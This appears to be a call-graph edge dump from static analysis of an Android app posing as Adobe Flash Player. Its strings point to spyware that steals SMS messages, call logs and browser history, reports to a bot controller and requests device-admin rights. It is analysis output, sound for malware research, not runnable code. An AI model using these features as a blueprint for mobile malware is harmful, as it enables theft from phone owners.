VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r8 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotID") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke $r56.<java.util.TreeMap: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void onDisabled(android.content.Context,android.content.Intent)>($r1, $r2) in <com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)> ==> <android.app.admin.DeviceAdminReceiver: void onDisabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("forceZ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r15 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("ru") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.io.FileInputStream openFileInput(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileInputStream openFileInput(java.lang.String)>
VIRTUAL edge: $l4 = virtualinvoke r3.<java.io.File: long lastModified()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: long lastModified()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("pid [%d] process [%s]\r", $r47) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("wifiOn") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean contains(java.lang.CharSequence)>("B") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", r25, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r24, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=doubled_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("*") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer.Certificate: void startActivity(android.content.Intent)>(r2) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.app.Activity: void startActivity(android.content.Intent)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("keyHttpGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("URL: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getCalls") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.MacrosStat: void <init>()> ==> <android.app.Service: void <init>()>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("rfs=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("forceZ", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>("android.app.extra.DEVICE_ADMIN", r3) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: android.content.Intent getIntent()>
SPECIAL edge: $r18 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotVer") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void onDestroy()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashW: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: android.content.Intent getIntent()>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashY: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void <init>()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean contains(java.lang.CharSequence)>("LOCKED") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("MacrosAData_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r19.<java.lang.String: boolean contains(java.lang.CharSequence)>("Off") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.io.FileInputStream openFileInput(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileInputStream openFileInput(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.flashplayer_.FlashARM: void <init>()> ==> <android.app.Activity: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onWindowFocusChanged(boolean)>($z0) in <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)> ==> <android.app.Activity: void onWindowFocusChanged(boolean)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("package", $r5, $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=browser_history&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_good&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" bytes") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("browserHistory") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
